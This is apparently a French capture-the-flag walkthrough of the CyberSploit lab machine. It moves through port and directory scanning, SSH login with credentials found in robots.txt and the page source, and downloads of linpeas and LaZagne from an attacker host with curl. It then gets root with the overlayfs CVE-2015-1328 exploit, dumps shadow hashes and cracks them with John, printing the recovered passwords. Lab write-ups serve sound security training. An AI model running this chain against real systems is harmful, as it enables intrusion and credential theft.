1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.73
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.73...100%
[+] Scan Nmap 192.168.56.73...100%
 
[+] 22/tcp open
[+] 80/tcp open 

==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/parrot/Massap/192.168.56.73-tcp.html        |
==========================================================
```

&nbsp;

&nbsp;<span style="color: #dddddd;"><span style="color: #dddddd;">👊</span></span> **Gobuster**

Voyons ce qui se cache sur ce serveur web

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $gobuster dir -u http://192.168.56.73/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.73/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 290]
/.htpasswd            (Status: 403) [Size: 290]
/cgi-bin/             (Status: 403) [Size: 289]
/hacker               (Status: 200) [Size: 3757743]
/index                (Status: 200) [Size: 2333]
/robots.txt           (Status: 200) [Size: 79]
/robots               (Status: 200) [Size: 79]
/server-status        (Status: 403) [Size: 294]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

Allons voir `robots.txt`

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $curl http://192.168.56.76/robots.txt
R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 
```

&nbsp;

Décrypter la chaîne de caractère `base64`

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $curl http://192.168.56.73/robots.txt | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    79  100    79    0     0  30419      0 --:--:-- --:--:-- --:--:-- 39500
Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}base64: entrée incorrecte
```

&nbsp;

Un utilisateur trouver dans le code source de la page web

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $curl http://192.168.56.73/ | grep user
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2333  100  2333    0     0   169k      0 --:--:-- --:--:-- --:--:--  175k
<!-------------username:itsskv--------------------->
```

&nbsp;

<span style="color: #dddddd;">🖥️</span> **NetExec**

Test en `SSH` de l’identifiants trouver

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $nxc ssh 192.168.56.73 -u itsskv -p 'cybersploit{youtube.com/c/cybersploit}'
SSH         192.168.56.73   22     192.168.56.73    [*] SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10
SSH         192.168.56.73   22     192.168.56.73    [+] itsskv:cybersploit{youtube.com/c/cybersploit}  Linux - Shell access
```

&nbsp;

<span style="color: #dddddd;">🤖</span> Linpeas

Upload de linpeas pour être root

```
itsskv@cybersploit-CTF:~$ curl -O 192.168.56.104:8080/linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  828k  100  828k    0     0  33.2M      0 --:--:-- --:--:-- --:--:-- 35.1M
```

&nbsp;

Exploit d’élévation de privilège trouver

```
itsskv@cybersploit-CTF:~$ sh linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

```

&nbsp;

<span style="color: #dddddd;">💀</span> **Exploit Overlays**

Exploitation de l’exploit

```
itsskv@cybersploit-CTF:/tmp$ ./overlays
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# bash -i
root@cybersploit-CTF:/tmp#

```

&nbsp;

&nbsp;**<span style="color: #dddddd;">👾</span> LaZagne**

Upload de lazagne pour trouver des identifiants

```
root@cybersploit-CTF:~$ curl -O 192.168.56.104:8080/LaZagne-2.4.6.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  688k  100  688k    0     0  30.4M      0 --:--:-- --:--:-- --:--:-- 32.0M
itsskv@cybersploit-CTF:~$ unzip LaZagne-2.4.6.zip
Archive:  LaZagne-2.4.6.zip
3ed06c785c417a77c2bc9a09987060425249036d
   creating: LaZagne-2.4.6/
```

&nbsp;

Exécution

```
root@cybersploit-CTF:/home/itsskv/LaZagne-2.4.6/Linux# python laZagne.py all 

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: itsskv
Hash: $6$hTEVux8E$HLs7NtxR8DlXO6mBVi62PeWm00cKiySj14KcS3Q5hSRjC9qRk3MHIuE1mw0RpzBYPenJ/OIOeJMk42xHptZJE/:18440:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$JNNQmwTH$u.panTGbXPVK5lP8jruAYYCsW4jDbxaYYOmLIIO5OTXiZeHSFUDSLtPXWqZ5Ih9VOmRTK1JVNVMI2knxkAimS0:18438:0:99999:7:::

[+] Hash found !!!
Login: cybersploit
Hash: $6$04Wj4cke$2..FbnsLjE1uTUsVMV.jHaWmzCZGCTxt55S7H2ezhfGAB2z9bxr0OsufLZ7gRsWOENcaGDVTlBvdP22ZRKQov.:18438:0:99999:7:::


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 27.5631690025
```

&nbsp;

**🧨 JohnTheRipper**

Crack des hash utilisateurs

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $john cybersploit --wordlist=rockyou.txt                                       
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shailendra       (cybersploit)     
shailendra       (root)     
2g 0:00:02:57 DONE (2025-02-09 20:23) 0.01126g/s 1886p/s 3772c/s 3772C/s shirley15..sexycoh
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john --show cybersploit 
root:shailendra:18438:0:99999:7:::
cybersploit:shailendra:18438:0:99999:7:::

2 password hashes cracked, 0 left
```

&nbsp;

Identifiant trouver

| Users | Password |
| --- | --- |
| root | shailendra |
| cybersploit | shailendra |
| itsskv | cybersploit{youtube.com/c/cybersploit} |